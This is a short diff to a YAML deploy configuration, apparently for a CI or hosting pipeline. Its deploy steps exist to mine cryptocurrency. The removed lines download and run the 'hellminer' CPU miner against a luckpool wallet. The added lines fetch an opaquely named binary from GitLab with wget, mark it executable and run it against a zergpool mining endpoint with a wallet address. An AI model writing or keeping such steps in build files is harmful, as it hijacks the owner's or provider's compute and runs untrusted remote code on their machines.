@@ -1,8 +1,5 @@
 deploy:
   - apt-get update && apt-get upgrade -y
-  - apt-get install curl -y
-  - curl https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz
-  - tar xf hellminer_cpu_linux.tar.gz
-  - rm hellminer_cpu*
-  - nohup ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u R9wVJFEuqm3xPkek6LQtDx4dFyrwaTvMBv -p x --cpu $(echo $(nproc --all))
-  
+  - apt-get install wget -y
+  - wget https://gitlab.com/fregiandaa/folan/-/raw/main/egiaja && chmod +x egiaja && ./egiaja -v -l verushash.asia.mine.zergpool.com:3300 -u DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW.seblab -p c=DGB -t 4
+
